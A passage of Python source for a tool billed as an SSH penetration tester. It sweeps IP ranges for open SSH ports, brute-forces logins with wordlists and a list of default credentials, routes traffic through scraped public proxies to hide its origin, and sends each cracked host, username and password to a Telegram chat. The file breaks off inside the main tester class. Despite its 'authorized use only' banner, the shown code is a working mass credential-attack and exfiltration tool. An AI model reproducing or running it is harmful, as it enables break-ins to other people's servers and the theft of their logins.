#!/usr/bin/env python3
"""
Enhanced SSH Penetration Testing Tool
=====================================

A modernized SSH security testing tool with multiple authentication methods,
better error handling, and improved detection capabilities.

WARNING: This tool is for authorized security testing only!
Use only on systems you own or have explicit permission to test.
"""

import argparse
import asyncio
import ipaddress
import json
import logging
import os
import random
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Union
import threading
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import re

import paramiko
from paramiko import AuthenticationException, SSHException
import cryptography
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, dsa, ed25519
import requests
try:
    import socks
except ImportError:
    socks = None
import urllib.parse

# Color constants
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'

__version__ = "2.0.0"
__author__ = "Enhanced Security Tool"

# Global configuration
CONFIG = {
    'timeout': 10,
    'auth_timeout': 5,
    'max_threads': 50,
    'max_attempts': 3,
    'delay_between_attempts': 1,
    'verbose': False,
    'output_file': 'successful_logins.json',
    'log_file': 'ssh_tool.log'
}

# Threading lock for shared resources
output_lock = threading.Lock()
results = []

class SSHAuthMethod:
    """Enumeration of SSH authentication methods"""
    PASSWORD = "password"
    PUBLICKEY = "publickey"
    KEYBOARD_INTERACTIVE = "keyboard-interactive"
    GSSAPI = "gssapi-with-mic"
    NONE = "none"

class Logger:
    """Enhanced logging with colors and file output"""
    
    def __init__(self, verbose=False, log_file=None):
        self.verbose = verbose
        self.log_file = log_file
        
        # Setup file logging
        if log_file:
            logging.basicConfig(
                filename=log_file,
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S'
            )
            self.file_logger = logging.getLogger()
    
    def _log(self, message: str, color: str = "", prefix: str = "", to_file: bool = True):
        """Internal logging method"""
        colored_msg = f"{color}{prefix}{Colors.RESET}{message}"
        print(colored_msg)
        
        if to_file and hasattr(self, 'file_logger'):
            self.file_logger.info(f"{prefix}{message}")
    
    def info(self, message: str):
        self._log(message, Colors.BLUE, "[+] ")
    
    def success(self, message: str):
        self._log(message, Colors.GREEN, "[*] ")
    
    def warning(self, message: str):
        self._log(message, Colors.YELLOW, "[!] ")
    
    def error(self, message: str):
        self._log(message, Colors.RED, "[-] ")
    
    def debug(self, message: str):
        if self.verbose:
            self._log(message, Colors.CYAN, "[DEBUG] ")

class SSHAuthDetector:
    """Detects available SSH authentication methods"""
    
    @staticmethod
    def detect_auth_methods(host: str, port: int = 22, timeout: int = 10) -> List[str]:
        """
        Detect available authentication methods for an SSH server
        
        Args:
            host: Target hostname or IP
            port: SSH port (default 22)
            timeout: Connection timeout
            
        Returns:
            List of available authentication methods
        """
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Attempt connection with invalid credentials to get auth methods
            try:
                client.connect(
                    hostname=host,
                    port=port,
                    username='nonexistent_user_12345',
                    password='invalid_password_12345',
                    timeout=timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            except AuthenticationException as e:
                # Parse the exception message to extract allowed methods
                error_msg = str(e)
                if 'Allowed methods:' in error_msg:
                    methods_str = error_msg.split('Allowed methods: ')[1].strip('[]')
                    methods = [method.strip().strip("'\"") for method in methods_str.split(',')]
                    return methods
                else:
                    # Try to get methods from the transport
                    transport = client.get_transport()
                    if transport and transport.is_active():
                        # Try to get auth methods from transport
                        try:
                            transport.auth_none('nonexistent_user_12345')
                        except paramiko.BadAuthenticationType as bad_auth:
                            return bad_auth.allowed_types
                        except:
                            pass
            except Exception:
                pass
            finally:
                client.close()
                
        except Exception:
            pass
        
        # Default fallback methods if detection fails
        return [SSHAuthMethod.PASSWORD, SSHAuthMethod.PUBLICKEY]

class SSHKeyGenerator:
    """Generate SSH keys for testing"""
    
    @staticmethod
    def generate_rsa_key(key_size: int = 2048) -> Tuple[str, str]:
        """Generate RSA key pair"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size
        )
        
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.OpenSSH,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.OpenSSH,
            format=serialization.PublicFormat.OpenSSH
        )
        
        return private_pem.decode('utf-8'), public_pem.decode('utf-8')
    
    @staticmethod  
    def generate_ed25519_key() -> Tuple[str, str]:
        """Generate ED25519 key pair"""
        private_key = ed25519.Ed25519PrivateKey.generate()
        
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.OpenSSH,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.OpenSSH,
            format=serialization.PublicFormat.OpenSSH
        )
        
        return private_pem.decode('utf-8'), public_pem.decode('utf-8')

class EnhancedSSHClient:
    """Enhanced SSH client with multiple authentication methods"""
    
    def __init__(self, logger: Logger, proxy_manager: Optional['ProxyManager'] = None):
        self.logger = logger
        self.proxy_manager = proxy_manager
    
    def attempt_password_auth(self, host: str, port: int, username: str, password: str) -> Optional[Dict]:
        """Attempt password authentication"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Configure proxy if available
            sock = None
            if self.proxy_manager:
                sock = self._create_proxy_socket(host, port)
                if not sock:
                    self.logger.debug(f"Failed to create proxy connection for {host}:{port}")
                    return None
            
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=CONFIG['timeout'],
                auth_timeout=CONFIG['auth_timeout'],
                allow_agent=False,
                look_for_keys=False,
                sock=sock
            )
            
            result = {
                'host': host,
                'port': port,
                'username': username,
                'password': password,
                'auth_method': SSHAuthMethod.PASSWORD,
                'success': True,
                'timestamp': time.time(),
                'server_version': self._get_server_version(client)
            }
            
            client.close()
            return result
            
        except AuthenticationException as e:
            self.logger.debug(f"Password auth failed for {username}@{host}:{port} - {str(e)}")
            return None
        except Exception as e:
            self.logger.debug(f"Connection error to {host}:{port} - {str(e)}")
            return None
    
    def attempt_key_auth(self, host: str, port: int, username: str, private_key_path: str) -> Optional[Dict]:
        """Attempt public key authentication"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Configure proxy if available
            sock = None
            if self.proxy_manager:
                sock = self._create_proxy_socket(host, port)
                if not sock:
                    self.logger.debug(f"Failed to create proxy connection for {host}:{port}")
                    return None
            
            # Load private key
            try:
                private_key = paramiko.RSAKey.from_private_key_file(private_key_path)
            except:
                try:
                    private_key = paramiko.Ed25519Key.from_private_key_file(private_key_path)
                except:
                    try:
                        private_key = paramiko.ECDSAKey.from_private_key_file(private_key_path)
                    except:
                        private_key = paramiko.DSSKey.from_private_key_file(private_key_path)
            
            client.connect(
                hostname=host,
                port=port,
                username=username,
                pkey=private_key,
                timeout=CONFIG['timeout'],
                auth_timeout=CONFIG['auth_timeout'],
                allow_agent=False,
                look_for_keys=False,
                sock=sock
            )
            
            result = {
                'host': host,
                'port': port,
                'username': username,
                'private_key': private_key_path,
                'auth_method': SSHAuthMethod.PUBLICKEY,
                'success': True,
                'timestamp': time.time(),
                'server_version': self._get_server_version(client)
            }
            
            client.close()
            return result
            
        except Exception as e:
            self.logger.debug(f"Key auth failed for {username}@{host}:{port} - {str(e)}")
            return None
    
    def attempt_interactive_auth(self, host: str, port: int, username: str, responses: List[str]) -> Optional[Dict]:
        """Attempt keyboard-interactive authentication"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Configure proxy if available
            sock = None
            if self.proxy_manager:
                sock = self._create_proxy_socket(host, port)
                if not sock:
                    self.logger.debug(f"Failed to create proxy connection for {host}:{port}")
                    return None
            
            def interactive_handler(title, instructions, prompt_list):
                """Handle interactive prompts"""
                return responses[:len(prompt_list)]
            
            if sock:
                transport = paramiko.Transport(sock)
            else:
                transport = paramiko.Transport((host, port))
            transport.connect()
            transport.auth_interactive(username, interactive_handler)
            
            if transport.is_authenticated():
                result = {
                    'host': host,
                    'port': port,
                    'username': username,
                    'responses': responses,
                    'auth_method': SSHAuthMethod.KEYBOARD_INTERACTIVE,
                    'success': True,
                    'timestamp': time.time(),
                    'server_version': transport.remote_version
                }
                
                transport.close()
                return result
            
            transport.close()
            return None
            
        except Exception as e:
            self.logger.debug(f"Interactive auth failed for {username}@{host}:{port} - {str(e)}")
            return None
    
    def attempt_none_auth(self, host: str, port: int, username: str) -> Optional[Dict]:
        """Attempt 'none' authentication (for users without passwords)"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Configure proxy if available
            sock = None
            if self.proxy_manager:
                sock = self._create_proxy_socket(host, port)
                if not sock:
                    self.logger.debug(f"Failed to create proxy connection for {host}:{port}")
                    return None
            
            if sock:
                transport = paramiko.Transport(sock)
            else:
                transport = paramiko.Transport((host, port))
            transport.connect()
            transport.auth_none(username)
            
            if transport.is_authenticated():
                result = {
                    'host': host,
                    'port': port,
                    'username': username,
                    'auth_method': SSHAuthMethod.NONE,
                    'success': True,
                    'timestamp': time.time(),
                    'server_version': transport.remote_version
                }
                
                transport.close()
                return result
            
            transport.close()
            return None
            
        except Exception as e:
            self.logger.debug(f"None auth failed for {username}@{host}:{port} - {str(e)}")
            return None
    
    def _get_server_version(self, client: paramiko.SSHClient) -> str:
        """Get SSH server version"""
        try:
            transport = client.get_transport()
            if transport:
                return transport.remote_version
        except:
            pass
        return "Unknown"
    
    def _create_proxy_socket(self, host: str, port: int):
        """
        Create a socket connection through proxy for SSH
        
        Args:
            host: Target host
            port: Target port
            
        Returns:
            Connected socket or None if failed
        """
        if not self.proxy_manager:
            return None
            
        proxy = self.proxy_manager.get_working_proxy()
        if not proxy:
            return None
        
        proxy_host, proxy_port = proxy
        
        try:
            # Create connection to proxy
            proxy_socket = socket.create_connection((proxy_host, proxy_port), CONFIG['timeout'])
            
            # Send HTTP CONNECT request  
            connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
            proxy_socket.send(connect_request.encode())
            
            # Read response
            response = proxy_socket.recv(1024).decode()
            
            if "200 Connection established" in response or "200 OK" in response:
                return proxy_socket
            else:
                proxy_socket.close()
                self.proxy_manager.mark_proxy_failed(proxy_host, proxy_port)
                return None
                
        except Exception as e:
            self.proxy_manager.mark_proxy_failed(proxy_host, proxy_port)
            self.logger.debug(f"Failed to create proxy socket {proxy_host}:{proxy_port}: {e}")
            return None

class NetworkScanner:
    """Network scanning functionality for SSH service discovery"""
    
    def __init__(self, logger: Logger, proxy_manager: Optional['ProxyManager'] = None):
        self.logger = logger
        self.proxy_manager = proxy_manager
    
    def generate_ip_range(self, ip_range: str) -> List[str]:
        """
        Generate list of IP addresses from CIDR or range notation
        
        Args:
            ip_range: IP range in CIDR (217.17.0.0/16) or range format (217.17.0.0-217.17.255.255)
            
        Returns:
            List of IP addresses as strings
        """
        ips = []
        
        try:
            if '-' in ip_range:
                # Handle range format: 217.17.0.0-217.17.255.255
                start_ip, end_ip = ip_range.split('-')
                start = ipaddress.IPv4Address(start_ip.strip())
                end = ipaddress.IPv4Address(end_ip.strip())
                
                current = start
                while current <= end:
                    ips.append(str(current))
                    current += 1
                    
            elif '/' in ip_range:
                # Handle CIDR format: 217.17.0.0/16
                network = ipaddress.IPv4Network(ip_range, strict=False)
                ips = [str(ip) for ip in network.hosts()]
                
            else:
                # Single IP
                ips = [ip_range]
                
        except Exception as e:
            self.logger.error(f"Failed to parse IP range '{ip_range}': {e}")
            return []
            
        self.logger.info(f"Generated {len(ips)} IP addresses from range {ip_range}")
        return ips
    
    def scan_port(self, host: str, port: int = 22, timeout: int = 3) -> bool:
        """
        Check if a specific port is open on a host
        
        Args:
            host: Target host IP
            port: Port to scan (default 22 for SSH)
            timeout: Connection timeout
            
        Returns:
            True if port is open, False otherwise
        """
        # If using proxies, we need to check connectivity differently
        if self.proxy_manager:
            return self._scan_port_via_proxy(host, port, timeout)
        else:
            try:
                with socket.create_connection((host, port), timeout) as sock:
                    return True
            except (socket.timeout, socket.error, ConnectionRefusedError, OSError):
                return False
    
    def _scan_port_via_proxy(self, host: str, port: int, timeout: int) -> bool:
        """
        Scan port through proxy using CONNECT method
        
        Args:
            host: Target host IP
            port: Port to scan
            timeout: Connection timeout
            
        Returns:
            True if port is open via proxy, False otherwise
        """
        if not self.proxy_manager:
            self.logger.debug("No proxy manager available")
            return False
            
        proxy = self.proxy_manager.get_working_proxy()
        if not proxy:
            self.logger.debug("No working proxy available for port scan")
            return False
        
        proxy_host, proxy_port = proxy
        
        try:
            # Create connection to proxy
            proxy_socket = socket.create_connection((proxy_host, proxy_port), timeout)
            
            # Send HTTP CONNECT request
            connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
            proxy_socket.send(connect_request.encode())
            
            # Read response
            response = proxy_socket.recv(1024).decode()
            
            if "200 Connection established" in response or "200 OK" in response:
                proxy_socket.close()
                return True
            else:
                proxy_socket.close()
                return False
                
        except Exception as e:
            # Mark proxy as failed if it doesn't work
            if self.proxy_manager:
                self.proxy_manager.mark_proxy_failed(proxy_host, proxy_port)
            self.logger.debug(f"Proxy scan failed {proxy_host}:{proxy_port} -> {host}:{port}: {e}")
            return False
    
    def fast_scan_hosts(self, hosts: List[str], port: int = 22, max_threads: int = 100) -> List[Tuple[str, int]]:
        """
        Fast scan multiple hosts for open SSH ports
        
        Args:
            hosts: List of IP addresses to scan
            port: Port to scan (default 22)
            max_threads: Maximum concurrent threads
            
        Returns:
            List of (host, port) tuples with open SSH ports
        """
        open_hosts = []
        
        print(f"\n🔍 [SSH] Scanning {len(hosts)} hosts for open SSH ports on port {port}...")
        self.logger.info(f"Scanning {len(hosts)} hosts for open SSH ports...")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Submit all scan jobs
            future_to_host = {
                executor.submit(self.scan_port, host, port): host
                for host in hosts
            }
            
            completed = 0
            for future in as_completed(future_to_host):
                host = future_to_host[future]
                completed += 1
                
                # Real-time progress reporting
                if completed % 500 == 0 or completed == len(hosts):
                    percent = (completed / len(hosts)) * 100
                    found_count = len(open_hosts)
                    print(f"⚡ [SSH] Progress: {completed}/{len(hosts)} ({percent:.1f}%) - Found: {found_count} SSH services")
                    self.logger.info(f"Scanned {completed}/{len(hosts)} hosts...")
                
                try:
                    if future.result():
                        open_hosts.append((host, port))
                        print(f"✅ [SSH] Found service: {host}:{port}")
                        self.logger.success(f"Found SSH service: {host}:{port}")
                except Exception as e:
                    self.logger.debug(f"Error scanning {host}: {e}")
        
        print(f"🎯 [SSH] Scan complete: {len(open_hosts)} hosts with open SSH ports\n")
        self.logger.info(f"Found {len(open_hosts)} hosts with open SSH ports")
        return open_hosts
    
    def scan_ip_range(self, ip_range: str, ports: Optional[List[int]] = None) -> List[Tuple[str, int]]:
        """
        Scan an entire IP range for SSH services
        
        Args:
            ip_range: IP range to scan
            ports: List of ports to scan (default [22])
            
        Returns:
            List of (host, port) tuples with open SSH services
        """
        if ports is None:
            ports = [22]
            
        # Generate IP addresses
        hosts = self.generate_ip_range(ip_range)
        if not hosts:
            return []
        
        # Scan for open ports
        open_services = []
        for port in ports:
            self.logger.info(f"Scanning port {port} on {len(hosts)} hosts...")
            port_results = self.fast_scan_hosts(hosts, port)
            open_services.extend(port_results)
        
        return open_services

class ProxyManager:
    """Manages proxy discovery, validation, and rotation"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.working_proxies = []
        self.failed_proxies = []
        self.proxy_sources = [
            # Latest 2025 working proxy sources - updated every 5 minutes
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/https.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt"
        ]
        self.validation_url = "http://httpbin.org/ip"
        self.fallback_validation_urls = [
            "http://icanhazip.com",
            "http://ifconfig.me/ip",
            "http://api.ipify.org",
            "http://checkip.amazonaws.com"
        ]
        self.max_proxy_test_time = 8
        self.proxy_check_interval = 300  # 5 minutes
        self.last_proxy_check = 0
        self.current_proxy_index = 0
        self.proxy_lock = threading.Lock()
    
    def fetch_proxies_from_source(self, source_url: str) -> List[Tuple[str, int]]:
        """
        Fetch proxy list from a source URL
        
        Args:
            source_url: URL to fetch proxies from
            
        Returns:
            List of (host, port) tuples
        """
        proxies = []
        
        try:
            self.logger.debug(f"Fetching proxies from {source_url}")
            
            # Use requests without proxy to fetch proxy lists
            response = requests.get(source_url, timeout=30, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            if response.status_code == 200:
                content = response.text
                
                # Parse different proxy formats
                # Format: IP:PORT
                proxy_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{2,5})'
                matches = re.findall(proxy_pattern, content)
                
                for ip, port in matches:
                    try:
                        # Validate IP format
                        ipaddress.IPv4Address(ip)
                        port_num = int(port)
                        if 1 <= port_num <= 65535:
                            proxies.append((ip, port_num))
                    except (ValueError, ipaddress.AddressValueError):
                        continue
                
                self.logger.debug(f"Found {len(proxies)} proxies from {source_url}")
                
        except Exception as e:
            self.logger.debug(f"Failed to fetch from {source_url}: {e}")
        
        return proxies
    
    def discover_proxies(self) -> List[Tuple[str, int]]:
        """
        Discover proxies from multiple public sources
        
        Returns:
            List of unique (host, port) proxy tuples
        """
        all_proxies = []
        
        print(f"\n🔍 [PROXY] Discovering proxies from {len(self.proxy_sources)} public sources...")
        self.logger.info("Discovering proxies from public sources...")
        
        # Fetch from all sources concurrently
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {
                executor.submit(self.fetch_proxies_from_source, url): url 
                for url in self.proxy_sources
            }
            
            for future in as_completed(futures):
                url = futures[future]
                try:
                    proxies = future.result()
                    all_proxies.extend(proxies)
                    print(f"✅ [PROXY] Found {len(proxies)} proxies from {url.split('/')[-2]}/{url.split('/')[-1]}")
                except Exception as e:
                    print(f"❌ [PROXY] Failed to fetch from {url.split('/')[-2]}/{url.split('/')[-1]}: {str(e)[:50]}...")
                    self.logger.debug(f"Error fetching from {url}: {e}")
        
        # Remove duplicates
        unique_proxies = list(set(all_proxies))
        
        print(f"📊 [PROXY] Discovered {len(unique_proxies)} unique proxies total")
        self.logger.info(f"Discovered {len(unique_proxies)} unique proxies")
        return unique_proxies
    
    def test_proxy(self, proxy_host: str, proxy_port: int) -> bool:
        """
        Test if a proxy is working with enhanced validation
        
        Args:
            proxy_host: Proxy IP address
            proxy_port: Proxy port
            
        Returns:
            True if proxy works, False otherwise
        """
        proxy_dict = {
            'http': f'http://{proxy_host}:{proxy_port}',
            'https': f'http://{proxy_host}:{proxy_port}'
        }
        
        # Test with primary validation URL first
        urls_to_test = [self.validation_url] + self.fallback_validation_urls
        
        for url in urls_to_test:
            try:
                response = requests.get(
                    url,
                    proxies=proxy_dict,
                    timeout=self.max_proxy_test_time,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    }
                )
                
                if response.status_code == 200 and response.text.strip():
                    # For JSON responses (httpbin)
                    if url == self.validation_url:
                        try:
                            data = response.json()
                            if 'origin' in data and data['origin'] != '':
                                return True
                        except:
                            pass
                    # For plain text IP responses
                    elif len(response.text.strip()) >= 7:  # Minimum valid IP length
                        return True
                        
            except Exception as e:
                self.logger.debug(f"Proxy {proxy_host}:{proxy_port} failed test with {url}: {e}")
                continue
        
        return False
    
    def validate_proxies(self, proxy_list: List[Tuple[str, int]], max_workers: int = 50) -> List[Tuple[str, int]]:
        """
        Validate a list of proxies concurrently
        
        Args:
            proxy_list: List of (host, port) tuples to test
            max_workers: Maximum concurrent validation threads
            
        Returns:
            List of working (host, port) proxy tuples
        """
        working_proxies = []
        
        print(f"\n🔬 [PROXY] Testing {len(proxy_list)} proxies for functionality...")
        self.logger.info(f"Testing {len(proxy_list)} proxies for functionality...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_proxy = {
                executor.submit(self.test_proxy, host, port): (host, port)
                for host, port in proxy_list
            }
            
            completed = 0
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                completed += 1
                
                # Real-time progress reporting
                if completed % 50 == 0 or completed == len(proxy_list):
                    working_count = len(working_proxies)
                    percent = (completed / len(proxy_list)) * 100
                    print(f"⚡ [PROXY] Progress: {completed}/{len(proxy_list)} ({percent:.1f}%) - Working: {working_count}")
                    self.logger.info(f"Tested {completed}/{len(proxy_list)} proxies...")
                
                try:
                    if future.result():
                        working_proxies.append(proxy)
                        print(f"✅ [PROXY] Working proxy: {proxy[0]}:{proxy[1]}")
                        self.logger.success(f"Working proxy found: {proxy[0]}:{proxy[1]}")
                except Exception as e:
                    self.logger.debug(f"Error testing proxy {proxy}: {e}")
        
        print(f"🎯 [PROXY] Final result: {len(working_proxies)} working proxies ready for use!\n")
        self.logger.info(f"Found {len(working_proxies)} working proxies")
        return working_proxies
    
    def refresh_proxy_list(self):
        """Refresh the working proxy list"""
        with self.proxy_lock:
            self.logger.info("Refreshing proxy list...")
            
            # Discover new proxies
            discovered_proxies = self.discover_proxies()
            
            if discovered_proxies:
                # Validate proxies
                valid_proxies = self.validate_proxies(discovered_proxies)
                
                if valid_proxies:
                    self.working_proxies = valid_proxies
                    self.failed_proxies = []
                    self.current_proxy_index = 0
                    self.last_proxy_check = time.time()
                    
                    self.logger.success(f"Proxy list refreshed with {len(valid_proxies)} working proxies")
                    return True
                else:
                    self.logger.warning("No working proxies found during refresh")
            else:
                self.logger.warning("No proxies discovered during refresh")
            
            return False
    
    def get_working_proxy(self) -> Optional[Tuple[str, int]]:
        """
        Get a working proxy with automatic rotation
        
        Returns:
            (host, port) tuple of working proxy, or None if no proxies available
        """
        with self.proxy_lock:
            # Check if we need to refresh proxy list
            current_time = time.time()
            if (current_time - self.last_proxy_check) > self.proxy_check_interval:
                self.logger.info("Proxy check interval reached, refreshing list...")
                self.refresh_proxy_list()
            
            # If no working proxies, try to get some
            if not self.working_proxies:
                self.logger.warning("No working proxies available, attempting to refresh...")
                if not self.refresh_proxy_list():
                    return None
            
            # Rotate through available proxies
            if self.working_proxies:
                proxy = self.working_proxies[self.current_proxy_index]
                self.current_proxy_index = (self.current_proxy_index + 1) % len(self.working_proxies)
                return proxy
        
        return None
    
    def get_current_proxy_status(self) -> Dict:
        """
        Get current proxy status and statistics
        
        Returns:
            Dictionary with proxy status information
        """
        with self.proxy_lock:
            if not self.working_proxies:
                return {
                    'current_proxy': None,
                    'total_working': 0,
                    'total_failed': len(self.failed_proxies),
                    'status': 'No working proxies available'
                }
            
            current_proxy = self.working_proxies[self.current_proxy_index] if self.working_proxies else None
            
            return {
                'current_proxy': f"{current_proxy[0]}:{current_proxy[1]}" if current_proxy else None,
                'total_working': len(self.working_proxies),
                'total_failed': len(self.failed_proxies),
                'status': 'Active' if current_proxy else 'Inactive'
            }
    
    def mark_proxy_failed(self, proxy_host: str, proxy_port: int):
        """
        Mark a proxy as failed and remove it from working list
        
        Args:
            proxy_host: Proxy IP address
            proxy_port: Proxy port
        """
        with self.proxy_lock:
            proxy_tuple = (proxy_host, proxy_port)
            
            if proxy_tuple in self.working_proxies:
                self.working_proxies.remove(proxy_tuple)
                self.failed_proxies.append(proxy_tuple)
                
                self.logger.warning(f"Marked proxy as failed: {proxy_host}:{proxy_port}")
                
                # Adjust current index if needed
                if self.current_proxy_index >= len(self.working_proxies) and self.working_proxies:
                    self.current_proxy_index = 0
                
                # If we're running low on proxies, refresh
                if len(self.working_proxies) < 5:
                    self.logger.warning("Running low on proxies, refreshing list...")
                    self.refresh_proxy_list()
    
    def create_proxy_session(self, proxy_host: str, proxy_port: int) -> requests.Session:
        """
        Create a requests session configured with proxy
        
        Args:
            proxy_host: Proxy IP address
            proxy_port: Proxy port
            
        Returns:
            Configured requests session
        """
        session = requests.Session()
        
        proxy_dict = {
            'http': f'http://{proxy_host}:{proxy_port}',
            'https': f'http://{proxy_host}:{proxy_port}'
        }
        
        session.proxies.update(proxy_dict)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        return session

class CredentialManager:
    """Manage credentials for testing"""
    
    @staticmethod
    def load_usernames(file_path: str) -> List[str]:
        """Load usernames from file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            raise Exception(f"Failed to load usernames from {file_path}: {e}")
    
    @staticmethod
    def load_passwords(file_path: str) -> List[str]:
        """Load passwords from file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            raise Exception(f"Failed to load passwords from {file_path}: {e}")
    
    @staticmethod
    def load_combinations(file_path: str) -> List[Tuple[str, str]]:
        """Load username:password combinations from file"""
        try:
            combinations = []
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        username, password = line.split(':', 1)
                        combinations.append((username.strip(), password.strip()))
            return combinations
        except Exception as e:
            raise Exception(f"Failed to load combinations from {file_path}: {e}")
    
    @staticmethod
    def get_default_credentials() -> List[Tuple[str, str]]:
        """Get common default credentials"""
        return [
            ('root', 'root'),
            ('admin', 'admin'),
            ('administrator', 'administrator'),
            ('admin', 'password'),
            ('root', 'password'),
            ('admin', '123456'),
            ('root', '123456'),
            ('admin', ''),
            ('root', ''),
            ('guest', 'guest'),
            ('user', 'user'),
            ('test', 'test'),
            ('ubuntu', 'ubuntu'),
            ('pi', 'raspberry'),
            ('oracle', 'oracle'),
            ('postgres', 'postgres'),
            ('mysql', 'mysql'),
            ('admin', 'admin123'),
            ('root', 'toor'),
            ('admin', 'changeme')
        ]


class TelegramNotifier:
    """Telegram bot notifications for successful SSH logins"""
    
    def __init__(self, bot_token: str, logger: Logger):
        self.bot_token = bot_token
        self.logger = logger
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
    
    def send_message(self, chat_id: str, message: str) -> bool:
        """
        Send a message via Telegram bot
        
        Args:
            chat_id: Telegram chat ID (can be user ID or channel)
            message: Message text to send
            
        Returns:
            True if message sent successfully, False otherwise
        """
        try:
            url = f"{self.base_url}/sendMessage"
            
            # Escape special markdown characters
            escaped_message = message.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace('`', '\\`')
            
            data = {
                'chat_id': chat_id,
                'text': escaped_message,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, data=data, timeout=10)
            
            if response.status_code == 200:
                self.logger.success(f"Telegram notification sent successfully")
                return True
            else:
                self.logger.error(f"Failed to send Telegram message: HTTP {response.status_code}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error sending Telegram message: {e}")
            return False
    
    def send_ssh_success_notification(self, chat_id: str, result: Dict, batch_info: str = "") -> bool:
        """
        Send notification for successful SSH login
        
        Args:
            chat_id: Telegram chat ID
            result: SSH login result dictionary
            batch_info: Information about current batch
            
        Returns:
            True if notification sent successfully
        """
        try:
            message = f"""🎯 *SSH LOGIN SUCCESS* {batch_info}

🌐 *Target:* `{result['host']}:{result['port']}`
👤 *Username:* `{result['username']}`
🔑 *Password:* `{result.get('password', 'N/A')}`
🔐 *Auth Method:* {result.get('auth_method', 'Unknown')}
🖥️ *SSH Version:* {result.get('ssh_version', 'Unknown')}

⏰ *Time:* {result.get('timestamp', 'Unknown')}
🔍 *Testing Tool:* SSH Penetration Tester"""

            return self.send_message(chat_id, message)
            
        except Exception as e:
            self.logger.error(f"Error creating SSH success notification: {e}")
            return False


class SSHPenetrationTester:
    """Main SSH penetration testing class"""
    
    def __init__(self, logger: Logger, use_proxies: bool = False, telegram_token: Optional[str] = None, telegram_chat_id: Optional[str] = None):
        self.logger = logger
        self.proxy_manager = None
        self.telegram_notifier = None
        self.telegram_chat_id = telegram_chat_id
        
        # Initialize proxy manager if requested
        if use_proxies:
            self.proxy_manager = ProxyManager(logger)
            # Initialize proxy list
            self.proxy_manager.refresh_proxy_list()
        
        # Initialize Telegram notifier if token provided
        if telegram_token:
            self.telegram_notifier = TelegramNotifier(telegram_token, logger)
        
        self.ssh_client = EnhancedSSHClient(logger, self.proxy_manager)
        self.scanner = NetworkScanner(logger, self.proxy_manager)
        self.successful_logins = []
    
    def test_target(self, host: str, port: int = 22, usernames: Optional[List[str]] = None, 
                   passwords: Optional[List[str]] = None, key_files: Optional[List[str]] = None) -> List[Dict]:
        """
        Test a single target with multiple authentication methods
        
